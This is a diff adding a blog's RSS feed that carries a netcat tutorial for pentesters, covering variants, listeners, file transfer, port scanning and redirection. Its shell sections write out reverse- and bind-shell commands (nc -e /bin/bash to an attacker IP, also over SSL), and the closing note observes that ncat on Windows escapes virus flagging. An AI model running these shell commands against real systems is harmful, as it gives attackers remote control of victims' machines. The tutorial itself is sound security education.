@@ -1,0 +1,191 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ncat on ikuamike</title>
+    <link>https://blog.ikuamike.io/tags/ncat/</link>
+    <description>Recent content in Ncat on ikuamike</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Michael Ikua</copyright>
+    <lastBuildDate>Thu, 08 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ncat/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Netcat - All you need to know</title>
+      <link>https://blog.ikuamike.io/posts/2021/netcat/</link>
+      <pubDate>Thu, 08 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/netcat/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. Netcat has been referred to as the TCP/IP / networking swiss army knife.
+In this article we&amp;rsquo;ll look at different applications of netcat and how it can be useful in day to day activities of a pentester, security professional, sysadmin etc&amp;hellip;&lt;/p&gt;
+&lt;p&gt;If you would like to test out these commands in a lab environment without the need to install them on your own machine have a look at my scenario on &lt;a href=&#34;https://app.cyberranges.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;CYBERRANGES&lt;/strong&gt;&lt;/a&gt;
+
+ using the
+link below.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Netcat Scenario&lt;/a&gt;
+
+&lt;/p&gt;
+&lt;h2 id=&#34;variants&#34;&gt;Variants&lt;/h2&gt;
+&lt;p&gt;There are several variants of netcat but most of the core functionality and command line options are very similar. Netcat having being initially written for Unix,
+the variants we will look at are linux based. You can also find netcat ports for windows that support similar commands to what we&amp;rsquo;ll look at.&lt;/p&gt;
+&lt;h3 id=&#34;netcat-traditional&#34;&gt;Netcat Traditional&lt;/h3&gt;
+&lt;p&gt;Netcat traditional is the original implementation and was written by a guy known as Hobbit. This does not typically come preinstalled unless you are using a distro like kali linux. It is no
+longer maintained and is on version 1.10.&lt;/p&gt;
+&lt;p&gt;By running &lt;code&gt;apt search netcat&lt;/code&gt; on an ubuntu/debian based machine, it appears as netcat or netcat-traditional.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;To install it you can then run &lt;code&gt;sudo apt install netcat-traditional&lt;/code&gt; or via compiling from source which you can get from the project page &lt;a href=&#34;https://nc110.sourceforge.io/&#34;&gt;https://nc110.sourceforge.io/&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;If you install the different variants of netcat on your system you may have to invoke the command with the full binary name. In this case we&amp;rsquo;ll run &lt;code&gt;nc.traditional -h&lt;/code&gt; to see the command line
+options.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;You notice the -e option, this is not available in the openbsd version. This is the feature that is considered a security hole. More on this when we get to the shells section.&lt;/p&gt;
+&lt;h3 id=&#34;gnu-netcat&#34;&gt;GNU Netcat&lt;/h3&gt;
+&lt;p&gt;GNU Netcat is a rewrite of the original netcat to make it more portable with new features and fully GNU compliant. This means it can be easily installed on almost all linux distros.
+This version is not available via package manager. It seems to also be no longer maintained as it&amp;rsquo;s latest version is 0.7.1 from 2004.&lt;/p&gt;
+&lt;p&gt;To get it you can download the source files from the project website &lt;a href=&#34;http://netcat.sourceforge.net&#34;&gt;http://netcat.sourceforge.net&lt;/a&gt; then compile it.&lt;/p&gt;
+&lt;p&gt;You need gcc and make to install successfully. The binary will be installed to /usr/local/bin/netcat. Below are the commands to use.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cd netcat-0.7.1/
+./configure
+make
+sudo make install
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h3 id=&#34;netcat-openbsd&#34;&gt;Netcat OpenBSD&lt;/h3&gt;
+&lt;p&gt;The Netcat OpenBSD version is a rewrite of the original netcat to include support for IPv6, proxies and unix sockets. In addition to those enhancements it is compiled to remove a feature that
+is considered a gaping security hole of the application.&lt;/p&gt;
+&lt;p&gt;This version is the most common and is what you will find installed by default in ubuntu distro (both desktop and server). For other linux distros you may have to install it yourself.&lt;/p&gt;
+&lt;p&gt;By running &lt;code&gt;apt search netcat&lt;/code&gt; on an ubuntu machine, it appears as netcat-openbsd package.&lt;/p&gt;
+&lt;p&gt;To install it you can then run &lt;code&gt;sudo apt install netcat-openbsd&lt;/code&gt;. When netcat is installed it is symlinked to nc and netcat for ease of invoking the command. We can see this
+by checking the realpath of nc and netcat, they point to the same nc.openbsd binary. This can be different depending on which variant you have installed in your system.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;The command line options available can be seen by running &lt;code&gt;netcat -h&lt;/code&gt;.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h3 id=&#34;ncat&#34;&gt;Ncat&lt;/h3&gt;
+&lt;p&gt;Ncat is the reimplementation of netcat from the nmap project. This version is more feature rich and improved. I personally use this on a day to day.&lt;/p&gt;
+&lt;p&gt;When installing nmap you get ncat installed as well, this applies for windows and linux. You can then run &lt;code&gt;ncat -h&lt;/code&gt; to see the command line options available.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;You can also compile from source to install it which can be downloaded from the nmap website &lt;a href=&#34;https://nmap.org/ncat/&#34;&gt;https://nmap.org/ncat/&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;features&#34;&gt;Features&lt;/h2&gt;
+&lt;p&gt;Now that we understand the different variants, let&amp;rsquo;s look at the most common features you&amp;rsquo;d use netcat for. Most of the syntax is common across the different
+variants.&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll focus on the 2 most recent variants, &lt;em&gt;netcat-openbsd&lt;/em&gt; and &lt;em&gt;ncat&lt;/em&gt; because they are the most recently maintained and updated.&lt;/p&gt;
+&lt;h3 id=&#34;server--client-mode&#34;&gt;Server / Client mode&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Server mode&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;In server mode you can use netcat to listen for connections. What this does is open a port (either tcp or udp) on the system.&lt;/p&gt;
+&lt;p&gt;By default netcat listens on tcp. The below command will listen on all interfaces on port 8080.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To specify the interface to listen on, for example localhost, you can use the below syntax for openbsd variant. Sometimes it may not be the best idea to
+listen on all interfaces depending on the situation.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -s 127.0.0.1 -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ncat prefers a different syntax when specifying the interface.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ncat -lvn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To listen on udp the syntax is similar to tcp but including -u option.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -l -u -v -n -p &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you noticed, the command line options can be used grouped together or separated.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Client mode&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;In client mode you can use netcat to connect to an open port on a system. This can be beneficial for manually checking service
+banners or just checking if the port is open.&lt;/p&gt;
+&lt;p&gt;For a tcp connection when connecting to IP 127.0.0.1 on port 8080, the syntax is as below.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For a udp connection we only add the -u option.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -uvn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reverse--bind-shells&#34;&gt;Reverse / Bind Shells&lt;/h3&gt;
+&lt;p&gt;Familiarity with the concept of reverse shells and bind shells is needed as it is not discussed in detail in this section as we are
+only looking at how netcat facilitates them.&lt;/p&gt;
+&lt;p&gt;This is very popular to pentesters and use of netcat makes it easy. I will use the server / client model for explanation.&lt;/p&gt;
+&lt;p&gt;The commands used only work on ncat,netcat traditional and gnu netcat. Netcat OpenBSD is compiled to not have this feature as it is
+considered a security risk.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Reverse shells&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;For a reverse shell, we use netcat in server mode to listen for connections then supply the shell from the client. This will allow
+the session on the server to run commands on the client once the shell is received. From a pentesting perspective the server would be
+the attacker machine and the client the victim machine.&lt;/p&gt;
+&lt;p&gt;Server (attacker machine)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Client (victim machine)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -e /bin/bash 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Something to note is that, just because the openbsd version does not have this -e option, does not mean that it is impossible to get a reverse
+shell when it&amp;rsquo;s installed. There are still ways it can be used to achieve a reverse shell.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Bind shells&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;For a bind shell, netcat in server mode listens for a connection and serves the shell process to any connecting client. Netcat running in
+client mode can then connect to the server and get shell access to the server and run commands. From a pentesting perspective the server
+would be the victim machine and the client the attacker machine.&lt;/p&gt;
+&lt;p&gt;Server (victim machine)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -e /bin/bash -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Client (attacker machine)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;file-transfer&#34;&gt;File Transfer&lt;/h3&gt;
+&lt;p&gt;Due to the ability to write to the connections raw, we can transfer files over the connection from one system to another without distortion.&lt;/p&gt;
+&lt;p&gt;For this we don&amp;rsquo;t really care about which is the server and which is the client because the transfer can go either direction but we need
+to run the listener first.&lt;/p&gt;
+&lt;p&gt;To transfer a file on server1 to server2 over port 8080 can be done as below:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;lt; infile   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+nc 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;gt; outfile  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To do the same in the opposite direction:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc 192.168.125.20 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;lt; infile &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;gt; outfile &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning&lt;/h3&gt;
+&lt;p&gt;This feature is not implemented in ncat but is available in the other variants. According to their website they omitted this feature because
+they have a better tool for that, which would be nmap.&lt;/p&gt;
+&lt;p&gt;Therefore if you find a system with netcat-openbsd and can&amp;rsquo;t install nmap you can run basic port scans as below.&lt;/p&gt;
+&lt;p&gt;To scan TCP ports on a target we can use the below syntax.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -nvv -w &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -z 127.0.0.1 1-1000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To scan UDP ports on a target we can use the below syntax.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -nvv -w &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -z -u 127.0.0.1 1-1000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;traffic-redirection&#34;&gt;Traffic Redirection&lt;/h3&gt;
+&lt;p&gt;This is only possible on the variants that support the -e option.&lt;/p&gt;
+&lt;p&gt;Take the below scenario where server1 cannot connect directly to server3 but can only go through server2.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;server1 &amp;lt;-------------&amp;gt; server2 &amp;lt;-------------&amp;gt; server3
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To redirect traffic from server1 to a web app running on server3 (192.168.125.40) on port 8080 we can execute the below ncat command on server2.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -klvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt; -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/nc 192.168.125.40 8080&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now you can reach the web app on server3 by accessing server2 on port 8000.&lt;/p&gt;
+&lt;h3 id=&#34;ncat-additional-features&#34;&gt;Ncat Additional Features&lt;/h3&gt;
+&lt;p&gt;From the features the security risks can be seen because there&amp;rsquo;s no encryption on the connection as netcat will write to the connection in its
+rawest form, therefore anyone sniffing the network can capture all your traffic unencrypted in the case of shells and file transfer. For bind shells,
+there&amp;rsquo;s no authentication therefore anyone connecting to the port the bind shell is listening on will be able to run commands on the machine.&lt;/p&gt;
+&lt;p&gt;When using ncat, some of these concerns are addressed as it allows for use of ssl as well as access control.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Encrypted Shells&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;For a reverse shell we&amp;rsquo;ll use the same command syntax but add &lt;code&gt;--ssl&lt;/code&gt; to the command, same goes for bind shells.&lt;/p&gt;
+&lt;p&gt;Server (attacker machine)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc --ssl -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Client (victim machine)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc --ssl -e /bin/bash 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Access Control&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;When using netcat in server mode the &lt;code&gt;--allow&lt;/code&gt; option can specify one host or network range to be allowed to connect to the port, this can be good
+for the bind shell situation. Similarly, you can use &amp;ndash;deny to deny access from a specific host or network range.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc --allow 127.0.0.1 -e /bin/bash -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above command will set the bind shell to only accept connections from localhost.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Netcat is a really great tool for network related activities, I find it really useful during CTFs and sometimes use it during pentests. There&amp;rsquo;s several other options that
+we haven&amp;rsquo;t looked into feel free to explore them, but I think we&amp;rsquo;ve covered should be enough for most of your use cases.&lt;/p&gt;
+&lt;p&gt;I haven&amp;rsquo;t explained the specific command line options -like -v -n because the help menu clearly explains them.&lt;/p&gt;
+&lt;p&gt;Challenge for you, play around with netcat for windows (specifically ncat because of ssl feature). It&amp;rsquo;s a nice utility that can help you get reverse shells and doesn&amp;rsquo;t get flagged as a virus.&lt;/p&gt;
+&lt;p&gt;Happy Hacking!&lt;/p&gt;
+&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Netcat&#34;&gt;https://en.wikipedia.org/wiki/Netcat&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://nmap.org/ncat/guide/index.html&#34;&gt;https://nmap.org/ncat/guide/index.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://netcat.sourceforge.net/&#34;&gt;http://netcat.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://nc110.sourceforge.io/&#34;&gt;https://nc110.sourceforge.io/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://eternallybored.org/misc/netcat/&#34;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/p&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
